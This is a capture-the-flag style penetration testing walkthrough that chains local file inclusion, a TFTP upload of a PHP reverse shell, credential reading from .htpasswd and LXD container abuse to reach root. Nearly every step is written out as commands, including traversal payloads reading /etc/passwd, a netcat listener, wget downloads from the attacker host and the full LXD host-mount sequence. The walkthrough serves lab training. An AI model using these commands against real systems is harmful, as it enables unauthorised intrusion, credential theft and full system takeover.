# 🛠️ Penetration Testing Walkthrough (LFI → TFTP → RCE → Privilege Escalation)

## 📌 Overview
This walkthrough demonstrates how multiple misconfigurations can be chained together to gain full system access:
- Enumeration
- Local File Inclusion (LFI)
- TFTP exploitation
- Reverse shell
- Credential harvesting
- Privilege escalation via LXD

> Enumeration is key — chaining vulnerabilities leads to compromise. :contentReference[oaicite:0]{index=0}

---

## 🔍 Step 1: Initial Enumeration

### Scan for Open Ports
```bash
nmap -sC -sV <target_IP>
```

**Result:**
- Port 80 (HTTP)
- Apache 2.4.29

---

## 🌐 Step 2: Web Application Analysis

Visit:
```
http://<target_IP>/?file=home.php
```

### Observation
- URL parameter: `file=`
- Indicates dynamic file inclusion

### Vulnerable Code Pattern
```php
if ($_GET['file']) {
    include($_GET['file']);
}
```

---

## ⚠️ Step 3: Exploit Local File Inclusion (LFI)

### Test LFI
```bash
curl "http://<target_IP>/?file=/etc/passwd"
```

✅ If successful → system file contents returned

### Bypass Directory Restrictions
```bash
curl "http://<target_IP>/?file=../../../etc/passwd"
```

---

## 🔎 Step 4: Identify Useful Information

From `/etc/passwd`:
- User discovered: `tftp`
- Home directory: `/var/lib/tftpboot`

---

## 📡 Step 5: Discover TFTP Service

### Scan UDP Ports
```bash
sudo nmap -sU <target_IP>
```

**Result:**
- Port 69/UDP → TFTP

---

## 📤 Step 6: Upload Reverse Shell via TFTP

### Create PHP Reverse Shell
```php
$ip = 'YOUR_IP';
$port = 1234;
```

### Upload Shell
```bash
tftp <target_IP>
put shell.php
```

OR

```bash
curl -T shell.php tftp://<target_IP>/
```

---

## 🧨 Step 7: Gain Remote Code Execution

### Start Listener
```bash
nc -lvnp 1234
```

### Trigger Shell via LFI
```bash
curl "http://<target_IP>/?file=/var/lib/tftpboot/shell.php"
```

---

## 🐚 Step 8: Stabilize Shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 🔐 Step 9: Credential Harvesting

### Navigate to Web Root
```bash
cd /var/www/html
ls -la
```

### Read Credentials
```bash
cat .htpasswd
```

**Found:**
```
mike:Sheffield19
```

---

## 🔄 Step 10: Lateral Movement

```bash
su mike
```

Enter password:
```
Sheffield19
```

---

## 🔺 Step 11: Privilege Escalation via LXD

### Check Groups
```bash
id
```

**Result:**
- User is in `lxd` group

---

## 📦 Step 12: Prepare LXD Exploit

### Download Alpine Image Files
- `lxd.tar.xz`
- `rootfs.squashfs`

### Host Files Locally
```bash
python3 -m http.server 8000
```

### Transfer to Target
```bash
wget http://<your_IP>:8000/lxd.tar.xz
wget http://<your_IP>:8000/rootfs.squashfs
```

---

## 🚀 Step 13: Import & Exploit LXD

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
```

---

## 👑 Step 14: Root Access

```bash
cd /mnt/root/root
ls
cat root.txt
```

✅ Root shell achieved!

---

## 🧠 Key Takeaways

- LFI can lead to RCE when combined with writable services (TFTP)
- Misconfigured services (TFTP, LXD) are critical attack vectors
- Credential reuse is common and dangerous
- Group memberships (`lxd`) can grant root-level privileges

---

## 📚 Skills Practiced

- Web exploitation (LFI)
- Network enumeration (TCP + UDP)
- Reverse shells
- Linux privilege escalation
- Container abuse (LXD)

---

